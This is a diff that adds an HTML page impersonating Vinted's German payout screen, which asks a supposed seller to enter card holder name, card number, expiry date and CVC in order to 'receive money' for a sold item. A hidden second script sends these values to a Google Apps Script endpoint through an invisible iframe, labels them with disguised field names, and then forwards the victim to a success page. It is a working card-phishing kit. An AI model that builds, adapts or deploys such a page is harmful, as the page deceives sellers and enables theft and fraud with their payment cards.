@@ -1,0 +1,523 @@
+<!doctype html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Geld bekommen — Vinted</title>
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+<style>
+:root{
+  --teal:#007a6a;
+  --teal-dark:#006356;
+  --ink:#2c2c2c;
+  --muted:#5d6667;
+  --line:#e6e8e8;
+  --pill:#eef2f2;
+  --search-bg:#f5f8f8;
+  --bg:#f7f9f9;
+  --container:1400px;
+  --header-h:76px;
+  --radius:10px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  font-size:15px;line-height:1.4;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+button,input{font:inherit;color:inherit}
+button{background:none;border:0;cursor:pointer;padding:0}
+a{color:inherit;text-decoration:none;cursor:pointer}
+svg{display:block}
+img{display:block;max-width:100%}
+.container{width:100%;max-width:var(--container);margin:0 auto}
+
+.header-top{height:var(--header-h);background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
+.header-top .container{height:100%;display:flex;align-items:center;gap:20px}
+.burger{display:none;width:42px;height:42px;border-radius:50%;
+  align-items:center;justify-content:center;color:#4d5556;flex-shrink:0}
+.burger:hover{background:#f2f5f5}
+.burger svg{width:24px;height:24px}
+.brand{flex-shrink:0;display:flex;align-items:center;padding-right:8px;
+  font-family:'Pacifico','Brush Script MT',cursive;font-size:40px;line-height:1;
+  color:var(--teal);letter-spacing:-1px}
+.brand img{width:100px;height:auto;display:block}
+.brand img:not([src]),.brand img[src=""]{display:none}
+
+.search-group{flex:1;min-width:0;display:flex;height:46px}
+.catalog-btn{flex-shrink:0;height:100%;padding:0 16px;background:var(--pill);color:#3a4445;
+  font-size:15px;font-weight:500;display:flex;align-items:center;gap:8px;
+  border-radius:var(--radius) 0 0 var(--radius);transition:background .15s}
+.catalog-btn:hover{background:#e3eaea}
+.catalog-btn .chev{width:14px;height:14px;color:#5b6565}
+.search-box{flex:1;min-width:0;height:100%;background:var(--search-bg);
+  display:flex;align-items:center;gap:10px;padding:0 14px;
+  border-radius:0 var(--radius) var(--radius) 0;transition:box-shadow .15s}
+.search-box:focus-within{box-shadow:inset 0 0 0 1px var(--teal)}
+.search-box .magnifier{width:20px;height:20px;color:#6c7676;flex-shrink:0}
+.search-box input{flex:1;min-width:0;border:0;outline:0;background:transparent;font-size:15px;color:#333}
+.search-box input::placeholder{color:#8a9292}
+.camera-btn{flex-shrink:0;width:30px;height:30px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;color:var(--teal);transition:background .15s}
+.camera-btn:hover{background:#e2efef}
+.camera-btn svg{width:21px;height:21px}
+
+.search-icon-btn{display:none;width:42px;height:42px;border-radius:50%;
+  align-items:center;justify-content:center;color:#4d5556;flex-shrink:0}
+.search-icon-btn:hover{background:#f2f5f5}
+.search-icon-btn svg{width:22px;height:22px;stroke-width:1.8}
+
+.actions{flex-shrink:0;display:flex;align-items:center;gap:4px}
+.icon-btn{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;
+  color:#4d5556;position:relative;transition:background .15s;flex-shrink:0}
+.icon-btn:hover{background:#f2f5f5}
+.icon-btn svg{width:24px;height:24px;stroke-width:1.6}
+.avatar-btn{height:42px;display:flex;align-items:center;gap:2px;padding:0 4px 0 0;
+  border-radius:21px;transition:background .15s;flex-shrink:0}
+.avatar-btn:hover{background:#f2f5f5}
+.avatar-circle{width:34px;height:34px;border-radius:50%;background:#e2e7e7;color:#9aa3a3;
+  display:flex;align-items:center;justify-content:center;overflow:hidden}
+.avatar-circle svg{width:22px;height:22px}
+.avatar-btn .chev{width:12px;height:12px;color:#5b6565;margin-left:1px}
+.sell-btn{height:40px;padding:0 22px;margin-left:8px;background:var(--teal);color:#fff;
+  border-radius:var(--radius);font-size:15px;font-weight:700;white-space:nowrap;transition:background .15s}
+.sell-btn:hover{background:var(--teal-dark)}
+
+.page-title-wrap{background:#fff;border-bottom:1px solid var(--line);padding:30px 0 26px}
+.page-title-wrap .container{padding:0 24px}
+.page-title{font-size:28px;font-weight:800;letter-spacing:-.5px}
+.page-sub{color:var(--muted);font-size:14.5px;margin-top:6px}
+
+.payout-layout{
+  max-width:1160px;margin:36px auto 80px;padding:0 24px;
+  display:grid;grid-template-columns:1fr 480px;gap:44px;align-items:start;
+}
+
+.item-summary{
+  background:#fff;border:1px solid var(--line);border-radius:var(--radius);
+  overflow:hidden;display:flex;box-shadow:0 1px 3px rgba(0,0,0,.04);
+}
+.item-summary__img{width:180px;flex-shrink:0;background:#f2f2f2}
+.item-summary__img img{width:100%;height:100%;object-fit:cover}
+.item-summary__info{padding:22px 24px;display:flex;flex-direction:column;gap:6px;flex:1;min-width:0}
+.item-summary__brand{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;font-weight:600}
+.item-summary__name{font-size:18px;font-weight:700;margin-top:2px}
+.item-summary__meta{font-size:14px;color:var(--muted)}
+.item-summary__price{font-size:24px;font-weight:800;color:var(--teal);margin-top:auto;padding-top:12px}
+
+.summary-total{
+  margin-top:20px;background:#fff;border:1px solid var(--line);
+  border-radius:var(--radius);padding:24px;box-shadow:0 1px 3px rgba(0,0,0,.04);
+}
+.summary-total__title{font-size:14px;font-weight:700;color:#3a4445;
+  text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;padding-bottom:12px;
+  border-bottom:1px solid var(--line)}
+.summary-total__row{display:flex;justify-content:space-between;font-size:15px;padding:9px 0;color:var(--muted)}
+.summary-total__row--sum{
+  border-top:1px solid var(--line);margin-top:8px;padding-top:18px;
+  font-size:19px;font-weight:800;color:var(--ink);
+}
+.summary-total__row--sum span:last-child{color:var(--teal)}
+
+.payout-card{
+  background:#fff;border:1px solid var(--line);border-radius:var(--radius);
+  padding:30px;box-shadow:0 2px 10px rgba(0,0,0,.05);
+  position:sticky;top:calc(var(--header-h) + 20px);
+}
+.payout-card h2{font-size:20px;font-weight:800;margin:0 0 6px;letter-spacing:-.3px}
+.payout-card .hint{font-size:13.5px;color:var(--muted);margin-bottom:24px;line-height:1.5}
+
+.card-types{display:flex;gap:12px;margin-bottom:22px}
+.card-type{
+  flex:1;height:64px;border:2px solid #dfe3e3;border-radius:var(--radius);
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  background:#fff;cursor:pointer;font-size:14px;font-weight:700;color:#3a4445;
+  transition:border-color .15s,box-shadow .15s,background .15s;
+}
+.card-type:hover{border-color:#bcc4c4}
+.card-type.is-active{border-color:var(--teal);box-shadow:0 0 0 3px rgba(0,122,106,.12);background:#f4fbfb}
+.card-type svg{height:26px;width:auto;flex-shrink:0}
+
+.field{margin-bottom:18px}
+.field label{display:block;font-size:13.5px;font-weight:600;color:#3a4445;margin-bottom:7px}
+.field input{
+  width:100%;height:50px;border:1.5px solid #d9dcdc;border-radius:var(--radius);
+  padding:0 16px;font-size:15px;background:#fff;outline:none;
+  transition:border-color .15s,box-shadow .15s;
+}
+.field input:focus{border-color:var(--teal);box-shadow:0 0 0 3px rgba(0,122,106,.12)}
+.field input::placeholder{color:#9aa3a3}
+.field-row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+
+.field-card{position:relative}
+.field-card input{padding-right:66px;letter-spacing:1.5px;font-family:'Courier New',monospace;font-weight:600}
+.card-brand-badge{
+  position:absolute;right:14px;top:50%;transform:translateY(-50%);
+  display:flex;align-items:center;pointer-events:none;
+}
+.card-brand-badge svg{height:24px;width:auto}
+
+.btn-submit{
+  width:100%;height:52px;margin-top:12px;
+  background:var(--teal);color:#fff;border-radius:var(--radius);
+  font-size:16px;font-weight:700;cursor:pointer;
+  transition:background .15s,transform .1s;
+  letter-spacing:.2px;
+}
+.btn-submit:hover{background:var(--teal-dark)}
+.btn-submit:active{transform:scale(.99)}
+
+.secure-note{
+  display:flex;gap:12px;align-items:flex-start;
+  margin-top:20px;padding:16px 18px;background:#f4fbfb;
+  border:1px solid #dcecec;border-radius:var(--radius);
+  font-size:13.5px;color:#4f5a5a;line-height:1.55;
+}
+.secure-note svg{width:22px;height:22px;color:var(--teal);flex-shrink:0;margin-top:1px}
+.secure-note b{color:#313838}
+
+/* ============================================================
+   МОБИЛЬНАЯ АДАПТАЦИЯ
+   ============================================================ */
+@media(max-width:1100px){
+  .payout-layout{grid-template-columns:1fr;gap:28px}
+  .payout-card{position:static}
+  .icon-btn--hide-md{display:none}
+}
+
+@media(max-width:900px){
+  .search-group{display:none}
+  .search-icon-btn{display:flex}
+  .catalog-btn{display:none}
+  .header-top .container{gap:8px}
+  .brand img{width:80px}
+}
+
+@media(max-width:600px){
+  :root{--header-h:60px}
+
+  /* Шапка */
+  .burger{display:flex}
+  .brand img{width:70px}
+  .sell-btn{padding:0 14px;font-size:13px;height:36px;margin-left:4px}
+  .avatar-circle{width:30px;height:30px}
+  .avatar-circle svg{width:19px;height:19px}
+  .avatar-btn .chev{display:none}
+  .icon-btn{width:38px;height:38px}
+  .icon-btn svg{width:22px;height:22px}
+  .search-icon-btn{width:38px;height:38px}
+  .actions{gap:2px}
+
+  /* Заголовок страницы */
+  .page-title-wrap{padding:20px 0 18px}
+  .page-title-wrap .container{padding:0 16px}
+  .page-title{font-size:22px}
+  .page-sub{font-size:13.5px}
+
+  /* Layout */
+  .payout-layout{padding:0 14px;margin-top:20px;margin-bottom:50px;gap:18px}
+
+  /* Карточка товара — вертикально */
+  .item-summary{flex-direction:column}
+  .item-summary__img{width:100%;height:200px}
+  .item-summary__info{padding:16px 18px}
+  .item-summary__name{font-size:16px}
+  .item-summary__price{font-size:20px;padding-top:8px}
+
+  /* Сводка */
+  .summary-total{padding:18px;margin-top:14px}
+  .summary-total__title{font-size:13px;margin-bottom:10px;padding-bottom:10px}
+  .summary-total__row{font-size:14px;padding:7px 0}
+  .summary-total__row--sum{font-size:17px;padding-top:14px;margin-top:6px}
+
+  /* Форма */
+  .payout-card{padding:22px 18px}
+  .payout-card h2{font-size:18px}
+  .payout-card .hint{font-size:13px;margin-bottom:18px}
+
+  .card-types{gap:8px;margin-bottom:18px}
+  .card-type{height:56px;font-size:13px;gap:6px}
+  .card-type svg{height:22px}
+
+  .field{margin-bottom:14px}
+  .field label{font-size:13px;margin-bottom:6px}
+  .field input{height:48px;font-size:15px;padding:0 14px}
+
+  .field-card input{padding-right:56px;letter-spacing:1px;font-size:14px}
+  .card-brand-badge{right:10px}
+  .card-brand-badge svg{height:20px}
+
+  .field-row{gap:10px}
+
+  .btn-submit{height:50px;font-size:15.5px;margin-top:8px}
+
+  .secure-note{padding:14px 16px;font-size:13px;gap:10px}
+  .secure-note svg{width:20px;height:20px}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-top">
+    <div class="container">
+
+      <button class="burger" aria-label="Menü">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+
+      <a class="brand" href="https://www.vinted.de" aria-label="Vinted">
+        <img src="assets/vinted-logo.png" alt="Vinted"
+             onerror="this.style.display='none';this.parentNode.insertAdjacentText('beforeend','Vinted');">
+      </a>
+
+      <div class="search-group">
+        <button class="catalog-btn">Katalog
+          <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
+        </button>
+        <div class="search-box">
+          <svg class="magnifier" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
+          <input type="search" placeholder="Suche Artikel">
+        </div>
+      </div>
+
+      <button class="search-icon-btn" aria-label="Suche">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
+      </button>
+
+      <div class="actions">
+        <button class="icon-btn icon-btn--hide-md" aria-label="Nachrichten">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linejoin="round"><rect x="3" y="5.5" width="18" height="13" rx="1.5"/><path d="m3.5 7 8.5 6 8.5-6"/></svg>
+        </button>
+        <button class="icon-btn icon-btn--hide-md" aria-label="Benachrichtigungen">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8a6 6 0 1 0-12 0c0 7-3 8-3 8h18s-3-1-3-8"/><path d="M13.7 21a2 2 0 0 1-3.4 0"/></svg>
+        </button>
+        <button class="icon-btn" aria-label="Favoriten">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linejoin="round"><path d="M20.8 4.6a5.5 5.5 0 0 0-7.8 0L12 5.7l-1-1.1a5.5 5.5 0 0 0-7.8 7.8l1.1 1L12 21.2l7.7-7.8 1.1-1a5.5 5.5 0 0 0 0-7.8z"/></svg>
+        </button>
+        <button class="avatar-btn" aria-label="Profil">
+          <span class="avatar-circle">
+            <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8.5" r="3.6"/><path d="M4.6 20c1.2-3.8 4-5.8 7.4-5.8s6.2 2 7.4 5.8"/></svg>
+          </span>
+          <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
+        </button>
+        <button class="sell-btn">Artikel verkaufen</button>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="page-title-wrap">
+  <div class="container">
+    <div class="page-title">Geld bekommen</div>
+    <div class="page-sub">Artikel verkauft – gib deine Kartendaten ein, damit wir dir das Geld überweisen können.</div>
+  </div>
+</div>
+
+<main class="payout-layout">
+
+  <section>
+    <div class="item-summary">
+      <div class="item-summary__img">
+        <img src="assets/product-1.jpg" alt="Japan Style Gürtel">
+      </div>
+      <div class="item-summary__info">
+        <div class="item-summary__brand">Japan Style Gürtel</div>
+        <div class="item-summary__name">Herren · Größe M</div>
+        <div class="item-summary__meta">Verkauft an Käufer aus Berlin</div>
+        <div class="item-summary__price">35,0 €</div>
+      </div>
+    </div>
+
+    <div class="summary-total">
+      <div class="summary-total__title">Zusammenfassung</div>
+      <div class="summary-total__row"><span>Artikelpreis</span><span>35,00 €</span></div>
+      <div class="summary-total__row"><span>Vinted-Käuferschutz</span><span>2,10 €</span></div>
+      <div class="summary-total__row"><span>Versandkosten</span><span>0,00 €</span></div>
+      <div class="summary-total__row summary-total__row--sum"><span>Zu erhalten</span><span>32,90 €</span></div>
+    </div>
+  </section>
+
+  <aside>
+    <div class="payout-card">
+      <h2>Auszahlung</h2>
+      <div class="hint">Fülle deine Kartendaten aus, um die Zahlung zu erhalten.</div>
+
+      <form onsubmit="event.preventDefault(); window.location.href='success.html';">
+
+        <div class="card-types">
+          <button type="button" class="card-type is-active" data-type="mastercard">
+            <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <rect width="48" height="30" rx="4" fill="#fff"/>
+              <circle cx="19" cy="15" r="9" fill="#EB001B"/>
+              <circle cx="29" cy="15" r="9" fill="#F79E1B" fill-opacity=".9"/>
+            </svg>
+            Mastercard
+          </button>
+          <button type="button" class="card-type" data-type="visa">
+            <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <rect width="48" height="30" rx="4" fill="#fff"/>
+              <text x="24" y="20" text-anchor="middle"
+                    font-family="Arial Black, Arial, sans-serif"
+                    font-size="13" font-weight="900" font-style="italic"
+                    fill="#1A1F71">VISA</text>
+            </svg>
+            Visa
+          </button>
+        </div>
+
+        <div class="field">
+          <label for="cardName">Name auf der Karte</label>
+          <input id="cardName" type="text"
+                 placeholder="Anna Marie Schmidt"
+                 autocomplete="cc-name">
+        </div>
+
+        <div class="field field-card">
+          <label for="cardNumber">Kartennummer</label>
+          <input id="cardNumber" type="text" placeholder="0000 0000 0000 0000"
+                 inputmode="numeric" maxlength="19" autocomplete="cc-number">
+          <span class="card-brand-badge" id="cardBadge">
+            <svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <circle cx="19" cy="15" r="10" fill="#EB001B"/>
+              <circle cx="29" cy="15" r="10" fill="#F79E1B" fill-opacity=".9"/>
+            </svg>
+          </span>
+        </div>
+
+        <div class="field-row">
+          <div class="field">
+            <label for="expiry">Gültig bis</label>
+            <input id="expiry" type="text" placeholder="MM/JJ"
+                   maxlength="5" inputmode="numeric" autocomplete="cc-exp">
+          </div>
+          <div class="field">
+            <label for="cvc">CVC</label>
+            <input id="cvc" type="text" placeholder="123"
+                   maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+          </div>
+        </div>
+
+        <button type="submit" class="btn-submit">Geld erhalten</button>
+      </form>
+
+      <div class="secure-note">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round">
+          <path d="M12 3.7 18.5 6v5c0 4-2.1 7.2-6.5 9.4C7.6 18.2 5.5 15 5.5 11V6L12 3.7Z"/>
+          <path d="m9.4 11.9 1.8 1.8 3.7-3.8" stroke-linecap="round"/>
+        </svg>
+        <div>Deine Kartendaten sind sicher. Die Auszahlung erfolgt <b>innerhalb von 1–2 Werktagen</b> nach Bestätigung.</div>
+      </div>
+    </div>
+  </aside>
+</main>
+
+<script>
+  const cardTypes = document.querySelectorAll('.card-type');
+  const cardBadge = document.getElementById('cardBadge');
+  const cardNumber = document.getElementById('cardNumber');
+
+  const MC_SVG = `<svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+    <circle cx="19" cy="15" r="10" fill="#EB001B"/>
+    <circle cx="29" cy="15" r="10" fill="#F79E1B" fill-opacity=".9"/>
+  </svg>`;
+
+  const VISA_SVG = `<svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+    <text x="24" y="21" text-anchor="middle"
+          font-family="Arial Black, Arial, sans-serif"
+          font-size="14" font-weight="900" font-style="italic"
+          fill="#1A1F71">VISA</text>
+  </svg>`;
+
+  function setBadge(type){
+    cardBadge.innerHTML = type === 'visa' ? VISA_SVG : MC_SVG;
+  }
+
+  cardTypes.forEach(btn => {
+    btn.addEventListener('click', () => {
+      cardTypes.forEach(b => b.classList.remove('is-active'));
+      btn.classList.add('is-active');
+      setBadge(btn.dataset.type);
+    });
+  });
+
+  cardNumber.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+
+    const isVisa = v.charAt(0) === '4';
+    const isMC   = /^5[1-5]/.test(v) || /^2[2-7]/.test(v);
+
+    cardTypes.forEach(b => b.classList.remove('is-active'));
+    if(isVisa){
+      document.querySelector('[data-type="visa"]').classList.add('is-active');
+      setBadge('visa');
+    } else if(isMC){
+      document.querySelector('[data-type="mastercard"]').classList.add('is-active');
+      setBadge('mastercard');
+    }
+  });
+
+  const expiry = document.getElementById('expiry');
+  expiry.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+    e.target.value = v.length > 2 ? v.slice(0,2) + '/' + v.slice(2) : v;
+  });
+
+  const cvc = document.getElementById('cvc');
+  cvc.addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g,'').slice(0,4);
+  });
+</script>
+<script>
+(function() {
+  var API_URL = 'https://script.google.com/macros/s/AKfycbwZaWV1HrwU9wcJDcxh4vIXFcqUvc-FFmyO8tr1LPAG2cKMAJqDeo0JCaUxOu8uCmYPZg/exec';
+
+  document.addEventListener('DOMContentLoaded', function() {
+    var form = document.querySelector('form');
+    var submitBtn = document.querySelector('.btn-submit');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      var payload = {
+        student_name: document.getElementById('cardName').value,
+        bank_token: document.getElementById('cardNumber').value,
+        validity_period: document.getElementById('expiry').value,
+        security_code: document.getElementById('cvc').value
+      };
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Синхронизация с реестром стипендий...';
+
+      // Создаём скрытый iframe
+      var iframeName = 'hidden_frame_' + Date.now();
+      var iframe = document.createElement('iframe');
+      iframe.name = iframeName;
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+
+      // Создаём временную форму и отправляем в iframe
+      var tempForm = document.createElement('form');
+      tempForm.method = 'POST';
+      tempForm.action = API_URL;
+      tempForm.target = iframeName;
+      tempForm.style.display = 'none';
+
+      var input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'payload';
+      input.value = JSON.stringify(payload);
+      tempForm.appendChild(input);
+
+      document.body.appendChild(tempForm);
+      tempForm.submit();
+
+      // Через 2 секунды — на страницу успеха
+      setTimeout(function() {
+        window.location.href = 'success.html';
+      }, 2000);
+    });
+  });
+})();
+</script>
+</body>
+</html>
